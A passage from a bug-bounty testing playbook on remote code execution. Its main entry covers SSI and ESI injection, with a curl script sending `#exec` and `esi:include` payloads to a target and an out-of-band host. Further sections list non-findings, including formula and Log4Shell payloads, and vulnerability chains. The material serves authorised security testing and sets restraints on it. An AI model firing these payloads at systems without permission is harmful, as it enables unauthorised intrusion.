  never `npm install` or `pip install` locally). The plugin feature belongs to administrators of a self-hosted
  install, whose role is to run code. The connection string is stored and never opened: no request arrives.
- **Escalate:** one host name per install, then stop: no environment variables, metadata or file system from
  there, even though the code could read them. Describe what the host could reach from its name and address. A
  lower role reaching the install feature is RCE-012. An installer whose flags we control is RCE-003.

### RCE-014 · A value written into a page that the web server or the CDN parses for SSI or ESI is executed there: `<!--#exec -->` runs a command, `<esi:include>` fetches a URL we name

| | |
|---|---|
| **Severity** | Medium standalone when SSI or ESI processing of our value is shown (an XSS-filter bypass, chain with XSS); High for an SSI include of a protected path or an ESI include that reaches an internal host; Critical for SSI `#exec` output |
| **Requires** | reflect\|user-content |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Code Injection · CWE-97 |
| **Prior art** | #192931, #159985, #1073780 |

- **Where:** responses served by Apache with mod_include (`.shtml`, `.stm`, `.shtm`, `XBitHack`), by IIS with
  server-side includes, by nginx with `ssi on` in front of the application (it processes proxied responses, so
  the application's output counts), and responses that pass an ESI processor: Varnish with ESI on, Akamai,
  Fastly, Squid, F5 and Oracle caches (`Surrogate-Control: content="ESI/1.0"`, `X-Varnish` and CDN headers in
  responses). The value must reach the HTML raw, with `<` intact: reflected parameters (`reflect`) and stored
  fields (`user-content`). Prior art: an SSI injection on a government site (#192931), XSS and SSI on one
  parameter (#159985), ESI injection chained with reflected XSS to account takeover (#1073780).
- **Test:** SSI and ESI tags look like comments or unknown XML to a browser and are executed by the server or
  the edge before the response leaves. A directive with a harmless, recognisable result shows processing: the
  server's date (`#echo var="DATE_LOCAL"`), nginx's `hostname` variable, an ESI comment that disappears. Then,
  only where processing is shown, the directive with impact: Apache `#exec cmd` (enabled by `Options +Includes`,
  refused under `IncludesNOEXEC`), ESI `include` of our URL, then of an internal one.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-014"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/search"; P=q                                            # a reflecting parameter; for a stored field, save the same strings and fetch the page
  r() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$2" "$U" -D "$D/$1.headers" -o "$D/$1.body" -w "$1\t%{http_code}\n"; sleep "$W"; }
  r ctl      'rce014a<b>x</b>rce014b'                           # markup must survive unescaped for any of this
  r ssi-echo 'rce014a<!--#echo var="DATE_LOCAL" -->rce014b'     # Apache, IIS
  r ngx-echo 'rce014a<!--# echo var="hostname" -->rce014b'      # nginx with ssi on
  r esi-cmt  'rce014a<esi:comment text="x"/>rce014b'            # removed by an ESI processor
  r esi-inc  "rce014a<esi:include src=\"http://rce014-esi.$OOB/\"/>rce014b"
  grep -aoh 'rce014a.\{0,120\}rce014b' "$D"/*.body              # raw bytes: a browser hides comments
  grep -aih 'surrogate-control\|x-varnish\|x-cache\|akamai' "$D"/*.headers | sort -u
  # processing shown by ssi-echo: one command
  r ssi-exec 'rce014a<!--#exec cmd="hostname" -->rce014b'
  ```
- **Proof:** the raw response where a directive was replaced by its result (a date, a host name, `rce014arce014b`
  with the ESI comment gone) next to the control; for `#exec`, the host name between the markers; for an ESI
  include, the request from the edge to our host, from the CDN's or cache's address rather than the origin's.
- **Not a finding when:** the directive is HTML-escaped in the raw bytes (`&lt;!--#`). It is present unchanged in
  the raw bytes: a browser hides it as a comment, which looks like processing on screen, so always read the raw
  body. `[an error occurred while processing this directive]` replaces `#exec`: SSI is parsed and exec is
  disabled; report processing at Medium, not code execution. The markers are joined because a sanitiser removed
  every unknown tag (it removes `<b>` in the control too, and `esi:include` brings no callback).
- **Escalate:** SSI `#include virtual` requests a path through the server itself, past rules that apply only to
  outside requests: show it with a path of the application that refuses outside requests, and stop at its title.
  An ESI include of an internal host is SSR-003. ESI processors that expand variables (Akamai `$(HTTP_COOKIE)`)
  put HttpOnly cookies into the page: XSS chapter, proven with our own session only. ESI tags pass many XSS
  filters: XSS chapter.

## Graveyard

- **Commands in a sandbox built to run them.** `id` in an online IDE, notebook, CI job, serverless function,
  code interpreter or "run your script" feature is the product working. Reportable only when the code crosses
  the boundary: another tenant's data, the provider's credentials, the provider's shared host (RCE-013's
  comparison).
- **Code execution by the role that owns it.** An administrator who installs a plugin, edits a theme's PHP or
  uses a script console is using the product (#436928, "RCE as Admin", paid nothing). Only a lower role
  (RCE-012) or a bypassed documented hardening is a finding.
- **A delay, a 500 or a WAF page on a semicolon.** One slow response, or a block page for `;` and `$(`, without
  RCE-001's proportional timing or a host-name lookup. Scanner output (commix, nuclei) without a manual proof:
  `automated`.
- **A DNS lookup without the host name.** A label resolved by a WAF, a mail or URL scanner or a log pipeline,
  from its own network, often minutes later: "external service interaction" at best, and `third-party` when it
  comes from a vendor.
- **Formula injection in exports.** `=cmd|...` or `=HYPERLINK(...)` in a CSV or spreadsheet that runs in the
  victim's spreadsheet program is client side and excluded by most programmes (`csv-injection`). Server-side
  engines are RCE-007.
- **Log4Shell by spraying.** `${jndi:ldap://...}` in logged headers is tested by DSR-004 (any Java application)
  and CVE-016 (product-specific positions) and is not repeated here, so the planner does not queue it three
  times. 14 reports in the index name Log4j or CVE-2021-44228; three were paid, $1,000, $1,000 and $50
  (#1624137, #1425474, #1427589). Expect `dup-risk`, and `known-cve` where the programme excludes old CVEs.
- **Version banners as findings.** ImageMagick, Ghostscript, ExifTool, LibreOffice or git versions reported as
  vulnerable without the advisory's proof on this asset (`known-cve`, `version-disclosure`).
- **Dependency confusion without permission.** An internal package name unclaimed on a public registry is the
  client-side chapter's programme-level item: prove by registry lookup and stop. It paid at the top in 2021
  (#925585 $30,000, #1043385 $11,500, #1007014 $9,000, #1104874 $5,000); publishing a package that runs on the
  organisation's machines needs the programme's written permission, and many policies now forbid it.
- **Exposed consoles and default credentials.** An unauthenticated Jenkins `/script` or Groovy console (#768266,
  #403402, #672243) and vendor default logins are the CLD chapter's and CVE-007/CVE-008; here they matter only
  behind a lower role.
- **Desktop, mobile and game clients.** A large share of this class (chat, sync, VPN and game clients) runs code
  on a user's machine, not on the server: not a web finding unless the programme lists the client as an asset.
- **Decompression and fork bombs.** Availability, not execution (`dos`): never sent.
- **A proof that is a shell.** A reverse shell, a directory listing, a read `.env` or used metadata credentials
  after a command ran break most policies; programmes close such reports or remove the researcher, and the
  report never needed them.

## Chains

- INF (exposed source, `.git`, stack traces) → RCE-001, RCE-003, RCE-005: the source names the sink and its
  quoting; test that exact parameter.
- SSR-009 (`gopher://` to an unauthenticated Redis, FastCGI or Docker API on loopback) → command execution:
  prove reach with a read-only command (`INFO`, `/version`) and describe the rest; writing keys or jobs is
  destructive.
- LFI (a write primitive, traversal in upload names) and UPL (an executable upload) → RCE-010's rule for where a
  file lands and whether it runs.
- RCE-004 and RCE-010 (symlink entries) → LFI: the same archive reads `/etc/hostname`.
- CRL (a mail-server or SMTP field that takes CRLF) → RCE-003: mail transfer options, as in the Grafana SMTP
  case (#1200647).
- DSR-003, DSR-004, DSR-006 → command execution through deserialization or a JNDI lookup; RCE-013's JDBC probes
  sit next to DSR-004's JNDI fields.
- TPL → command execution through template engines and the OGNL, SpEL and EL expression languages, which this
  chapter does not repeat.
- NSQ (`$where` evaluated by MongoDB) ↔ RCE-007 (`$where` evaluated in the application's own process by a query
  library).
- BAC-011 (the member reaches an administrator's request) → RCE-012: when the request runs code, the finding is
  Critical.
- XSS (stored, rendered to our administrator) or CSR (no CSRF protection on a run or install request) → RCE-012:
  the administrator's browser calls the code feature; proven on our own administrator account.
- RCE-003 (installer flags) → RCE-013 (the probe package served from our index).
- RCE-002 and RCE-013 host names → CLD: describe what the host's role or address could reach; never use metadata
  credentials.

## Sources

- `kb/reports/rce.md` and `kb/reports/all/rce.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"Command injection"}`, `find_bypasses {"protection":"command injection filter"}`, `find_payloads {"topic":"Command Injection"}`.
- PortSwigger Web Security Academy, OS command injection; OWASP WSTG-INPV-08 (SSI injection), WSTG-INPV-11 (code
  injection) and WSTG-INPV-12 (command injection); PayloadsAllTheThings, Command Injection, Argument Injection,
  Server Side Include Injection and LaTeX Injection.
- SonarSource, Argument Injection Vectors (options that run commands or touch files, per binary); GTFOBins.
- ImageTragick (2016, CVE-2016-3714); Tavis Ormandy's Ghostscript `-dSAFER` bypasses (2018); the ExifTool
  CVE-2021-22204 advisory; git's security advisories (`protocol.allow`, CVE-2017-1000117, CVE-2024-32002,
  CVE-2025-48384).
- GoSecure, "Beyond XSS: Edge Side Include Injection" (2018); "Make JDBC Attacks Brilliant Again" (HITB 2021) for
  H2 and pgjdbc connection-string attacks; the TeX Live `texmf.cnf` documentation of `openin_any`,
  `openout_any` and `shell_escape`.
